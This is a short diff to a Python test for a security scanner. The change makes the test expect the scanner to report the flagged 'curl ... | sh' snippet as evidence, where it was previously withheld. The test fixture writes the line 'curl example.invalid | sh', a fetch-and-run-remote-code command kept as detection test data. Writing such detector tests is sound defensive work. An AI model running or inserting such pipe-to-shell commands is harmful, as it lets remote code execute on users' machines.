@@ -168,7 +168,7 @@ def test_sensitive_string_keeps_generic_security_findings(tmp_path):
     (tmp_path / 'run.py').write_text(source)
     findings = detectors.detect_snapshot(tmp_path, CapabilityManifest())
     curl = next(f for f in findings if f.id == 'static.shell.curl-pipe')
-    assert curl.evidence == '[withheld]'
+    assert 'curl' in curl.evidence and '| sh' in curl.evidence
     _assert_no_fragments(value, [repr(findings).encode()])
     (tmp_path / 'run.py').write_text('command = "curl example.invalid | sh"\n')
     curl = next(f for f in detectors.detect_snapshot(tmp_path, CapabilityManifest()) if f.id == 'static.shell.curl-pipe')
